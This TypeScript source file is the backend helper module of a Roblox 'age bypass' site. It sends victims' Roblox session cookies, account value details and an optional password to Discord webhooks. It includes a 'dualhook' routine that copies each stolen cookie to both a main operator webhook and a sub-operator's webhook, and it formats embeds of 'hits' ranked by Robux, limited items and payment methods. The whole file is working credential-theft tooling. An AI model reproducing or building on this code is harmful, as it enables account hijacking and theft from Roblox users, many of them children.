// Storage + Discord webhook helpers

// ============================================================
// LEGACY: Token system (kept exported as no-ops/stubs so any old
// imports won't crash; token UI has been fully removed).
// ============================================================
export interface Token {
  id: string;
  token: string;
  label: string;
  createdAt: Date;
  expiresAt: Date;
  used: boolean;
}
export interface LoginRecord { tokenLabel: string; timestamp: Date }
export function getTokens(): Token[] { return []; }
export function isTokenExpired(_t: Token): boolean { return true; }
export function generateToken(label: string, hours = 24): Token {
  const now = new Date();
  return { id: crypto.randomUUID(), token: '', label, createdAt: now, expiresAt: new Date(now.getTime() + hours * 3600_000), used: false };
}
export function validateToken(_s: string): Token | null { return null; }
export function deleteToken(_id: string) {}
export function getLoginLog(): LoginRecord[] { return []; }

// ============================================================
// Directories (Dualhook)
// ============================================================
export interface Directory {
  id: string;
  name: string;
  bypassWebhook: string;
  fetchCookieWebhook: string;
  liveBypassWebhook: string;
}

const DIR_KEY = 'directories_v1';
const ACTIVE_DIR_KEY = 'active_directory_id';

export function getDirectories(): Directory[] {
  try { return JSON.parse(localStorage.getItem(DIR_KEY) || '[]'); } catch { return []; }
}
export function saveDirectories(list: Directory[]) {
  localStorage.setItem(DIR_KEY, JSON.stringify(list));
}
export function addDirectory(d: Omit<Directory, 'id'>): Directory {
  const list = getDirectories();
  const dir: Directory = { ...d, id: crypto.randomUUID() };
  list.push(dir);
  saveDirectories(list);
  return dir;
}
export function deleteDirectory(id: string) {
  saveDirectories(getDirectories().filter(d => d.id !== id));
  if (getActiveDirectoryId() === id) setActiveDirectoryId(null);
}
export function getActiveDirectoryId(): string | null {
  return sessionStorage.getItem(ACTIVE_DIR_KEY);
}
export function setActiveDirectoryId(id: string | null) {
  if (id) sessionStorage.setItem(ACTIVE_DIR_KEY, id);
  else sessionStorage.removeItem(ACTIVE_DIR_KEY);
}
export function getActiveDirectory(): Directory | null {
  const id = getActiveDirectoryId();
  if (!id) return null;
  return getDirectories().find(d => d.id === id) || null;
}

// ============================================================
// Webhook URLs (admin settings) — 4 receivers
// ============================================================
export const WK = {
  bypass: 'wh_bypass',
  fetchCookie: 'wh_fetch_cookie',
  directory: 'wh_directory',
  liveBypass: 'wh_live_bypass',
  // legacy
  legacy: 'discord_webhook_url',
  discordInvite: 'discord_invite_url',
  siteUrl: 'site_url',
} as const;
export function getWebhook(key: string): string {
  return localStorage.getItem(key) || '';
}
export function setWebhook(key: string, value: string) {
  localStorage.setItem(key, value);
}

// ============================================================
// Embed data
// ============================================================
export interface AccountInfo {
  valid: boolean;
  cookie?: string;
  username?: string;
  userId?: string | number;
  displayName?: string;
  avatarUrl?: string;
  robux?: string | number;
  pendingRobux?: string | number;
  robuxSpent?: string | number;
  premium?: boolean;
  korblox?: boolean;
  headless?: boolean;
  valkyrie?: boolean;
  hasPayment?: boolean;
  has2FA?: boolean;
  emailVerified?: boolean;
  phoneVerified?: boolean;
  ageVerified?: boolean;
  accountAgeDays?: number;
  under13?: boolean;
  rap?: string | number;
  passesBB?: number;
  passesADM?: number;
  passesMM2?: number;
  password?: string;
}

const BOT_NAME = 'RBX TOOLS';
const FOOTER_BASE = 'Live RBXBYPASS · 2026';
const SITE_URL_DEFAULT = 'https://Rblxbypasser.com';

// ============================================================
// Cookie validation
// ============================================================
export const COOKIE_PREFIX = 'CAEaAh';
export function isValidCookieFormat(cookie: string): boolean {
  if (!cookie) return false;
  const trimmed = cookie.trim();
  // Either the full Roblox warning-prefixed cookie that contains CAEaAh, OR a raw cookie starting with CAEaAh
  return trimmed.includes(COOKIE_PREFIX);
}

// ============================================================
// Live Bypass Log (recent activity shown on dashboard)
// ============================================================
export interface LiveBypassEntry {
  id: string;
  username: string;
  avatarUrl?: string;
  success: boolean;
  timestamp: number;
}
const LIVE_LOG_KEY = 'live_bypass_log';
export function getLiveBypassLog(): LiveBypassEntry[] {
  try { return JSON.parse(localStorage.getItem(LIVE_LOG_KEY) || '[]'); } catch { return []; }
}
export function pushLiveBypass(entry: Omit<LiveBypassEntry, 'id' | 'timestamp'>) {
  const list = getLiveBypassLog();
  list.unshift({ ...entry, id: crypto.randomUUID(), timestamp: Date.now() });
  localStorage.setItem(LIVE_LOG_KEY, JSON.stringify(list.slice(0, 25)));
}

const yn = (v?: boolean) => (v ? '✅' : '❎');
const passField = (n?: number) => (typeof n === 'number' && n > 0) ? `✅ ${Math.min(n, 10)}` : '❎';

function nowFooter(): string {
  const d = new Date();
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  const dd = String(d.getDate()).padStart(2, '0');
  const yy = d.getFullYear();
  const hh = String(d.getHours()).padStart(2, '0');
  const mi = String(d.getMinutes()).padStart(2, '0');
  return `${FOOTER_BASE} | ${mm}/${dd}/${yy} ${hh}:${mi}`;
}

function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
  return {
    title: 'RBX HITS',
    url: siteUrl,
    color: d.valid ? 0x22c55e : 0xef4444,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    fields: [
      { name: '👤 User', value: `\`${d.username || 'N/A'}\``, inline: true },
      { name: '💰 Robux', value: `\`${d.robux ?? 0} | ${d.pendingRobux ?? 0}\``, inline: true },
      { name: '🧾 Summary (Spent)', value: `\`${d.robuxSpent ?? 0}\``, inline: true },
      { name: '💎 Premium', value: yn(d.premium), inline: true },
      { name: '👑 Korblox', value: yn(d.korblox), inline: true },
      { name: '🗿 Headless', value: yn(d.headless), inline: true },
      { name: '💳 Payment', value: yn(d.hasPayment), inline: true },
      { name: '🎒 RAP', value: `\`${d.rap ?? 0}\``, inline: true },
      { name: '🎂 Age (days)', value: `\`${d.accountAgeDays ?? 0}\``, inline: true },
      { name: 'BB', value: passField(d.passesBB), inline: true },
      { name: 'ADM', value: passField(d.passesADM), inline: true },
      { name: 'MM2', value: passField(d.passesMM2), inline: true },
    ],
    footer: { text: nowFooter() },
  };
}

function buildCookieEmbed(d: AccountInfo) {
  const cookie = d.cookie || '';
  return {
    title: 'ROBLOX AGE BYPASSER 2026',
    color: 0x4f46e5,
    description: '```\n' + cookie + '\n```',
    footer: { text: nowFooter() },
  };
}

function buildLiveEmbed(d: AccountInfo) {
  return {
    title: 'Live Bypass Status',
    color: 0x4f46e5,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description: [
      `**User:** \`${d.username || 'N/A'}\``,
      `**Robux:** \`${d.robux ?? 0}\``,
      `**Premium:** ${yn(d.premium)}`,
      `**Korblox:** ${yn(d.korblox)}`,
      `**Headless:** ${yn(d.headless)}`,
      `**Valkyrie:** ${yn(d.valkyrie)}`,
      `**API Status:** ✅ Processing`,
      `**Cookie Refreshed:** ✅`,
      ``,
      `🏦 **Summary:** \`${d.robuxSpent ?? 0}\``,
      `🪙 **Premium:** ${d.premium ? 'True' : 'False'}`,
    ].join('\n'),
    footer: { text: nowFooter() },
  };
}

function buildLiveFailedEmbed(d: AccountInfo, reason?: string) {
  return {
    title: 'BLOCK BYPASS',
    color: 0xef4444,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description: [
      `**User:** \`${d.username || 'N/A'}\``,
      `**Status:** ❎ Bypass Failed`,
      reason ? `**Reason:** \`${reason}\`` : '',
      `**API Status:** ❎ Blocked`,
    ].filter(Boolean).join('\n'),
    footer: { text: nowFooter() },
  };
}

async function post(url: string, body: any) {
  if (!url) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { console.error('Webhook failed:', e); }
}

// Send a "hit" (bypass or fetch) — info embed + cookie embed
export async function sendHitEmbed(webhookUrl: string, d: AccountInfo, opts: { tag?: string } = {}) {
  if (!webhookUrl) return;
  const siteUrl = getWebhook(WK.siteUrl) || SITE_URL_DEFAULT;
  await post(webhookUrl, {
    username: BOT_NAME,
    content: opts.tag ? `**${opts.tag}**` : undefined,
    embeds: [buildInfoEmbed(d, siteUrl), buildCookieEmbed(d)],
  });
}

// Send Live Bypass (no cookie)
export async function sendLiveBypassEmbed(webhookUrl: string, d: AccountInfo) {
  if (!webhookUrl) return;
  await post(webhookUrl, {
    username: BOT_NAME,
    embeds: [buildLiveEmbed(d)],
  });
}

export async function sendLiveBypassFailedEmbed(webhookUrl: string, d: AccountInfo, reason?: string) {
  if (!webhookUrl) return;
  await post(webhookUrl, {
    username: BOT_NAME,
    embeds: [buildLiveFailedEmbed(d, reason)],
  });
}

export async function broadcastLiveBypass(d: AccountInfo) {
  const dir = getActiveDirectory();
  await Promise.all([
    sendLiveBypassEmbed(getWebhook(WK.liveBypass), d),
    dir?.liveBypassWebhook ? sendLiveBypassEmbed(dir.liveBypassWebhook, d) : Promise.resolve(),
  ]);
}
export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string) {
  const dir = getActiveDirectory();
  await Promise.all([
    sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason),
    dir?.liveBypassWebhook ? sendLiveBypassFailedEmbed(dir.liveBypassWebhook, d, reason) : Promise.resolve(),
  ]);
}

// Dualhook send — sends to both the directory's webhook AND the main webhook
export async function dualhookSend(
  kind: 'bypass' | 'fetch',
  d: AccountInfo,
) {
  const dir = getActiveDirectory();
  const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
  const mainUrl = getWebhook(mainKey);
  const dirUrl = dir ? (kind === 'bypass' ? dir.bypassWebhook : dir.fetchCookieWebhook) : '';

  const tag = kind === 'bypass' ? 'Bypass Hit' : 'Fetch Cookie';
  await Promise.all([
    sendHitEmbed(mainUrl, d, { tag: `${tag} · Main` }),
    dirUrl ? sendHitEmbed(dirUrl, d, { tag: `${tag} · ${dir?.name || 'Directory'}` }) : Promise.resolve(),
  ]);
}

// Notify when a new directory is created
export async function notifyDirectoryCreated(dir: Directory) {
  const url = getWebhook(WK.directory);
  if (!url) return;
  await post(url, {
    username: BOT_NAME,
    embeds: [{
      title: '📁 New Directory Created',
      color: 0x4f46e5,
      fields: [
        { name: 'Name', value: `\`${dir.name}\``, inline: false },
        { name: 'Bypass Webhook', value: `\`${dir.bypassWebhook ? 'set' : '—'}\``, inline: true },
        { name: 'Fetch Webhook', value: `\`${dir.fetchCookieWebhook ? 'set' : '—'}\``, inline: true },
        { name: 'Live Webhook', value: `\`${dir.liveBypassWebhook ? 'set' : '—'}\``, inline: true },
      ],
      footer: { text: nowFooter() },
    }],
  });
}

// Backwards-compat shim for any leftover callers
export async function sendBypassEmbed(webhookUrl: string, data: any) {
  await sendHitEmbed(webhookUrl, { ...data, valid: !!data.valid });
}
export async function sendDiscordWebhook(webhookUrl: string, message: string) {
  await post(webhookUrl, { username: BOT_NAME, content: message });
}
